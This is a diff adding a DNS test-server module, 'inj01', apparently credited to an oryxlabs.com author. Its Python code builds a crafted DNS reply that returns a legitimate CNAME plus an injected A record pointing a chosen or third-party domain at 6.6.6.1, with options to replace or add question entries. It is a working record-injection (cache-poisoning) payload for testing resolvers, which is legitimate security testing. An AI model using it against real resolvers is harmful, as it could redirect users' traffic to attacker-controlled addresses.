@@ -1,0 +1,46 @@
+[module]
+name = "inj01"
+info = "Injection 1 - CNAME with injected A record in the end"
+desc = "Respond with legit CNAME (end.yourdomain.com) + injected A record (inj1poc.yourdomain.com -> 6.6.6.6)."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("inj01"):
+   # Send 1 CNAME + 1 injected A record
+   injip = "6.6.6.1"
+   enddom = "end." + req.sld_tld_domain
+   addedquestions = b''
+   if "3rdparty" in req.subdomains:  # inject a 3rd party domain
+      injdom = "injected01." + a3rdparty_domain
+   else:
+      injdom = "injected01." + req.sld_tld_domain
+   if "replq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      req.full_domain = injdom
+      addcustomlog("REPLQ")
+   if "addq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + req.type_bin + req.class_bin
+      addcustomlog("ADDQ")
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', resp.QURR, 2, 0, 0)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   buffer += addedquestions
+   ### ANSWER SECTION ########
+   # CNAME
+   buffer += convDom2Bin(req.full_domain) + getTypeBin("CNAME") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", len(enddom)+2)            ## Data length
+   buffer += convDom2Bin(enddom)                         ## CNAME value
+   # injected A
+   buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", 4)                        ## Data length
+   buffer += socket.inet_aton(injip)                     ## IP
+   # log and send
+   log("CNAME %s + A %s (%s)" % (enddom, injdom, injip))
+   send_buf(self, buffer)
+   #####################################################################
+'''
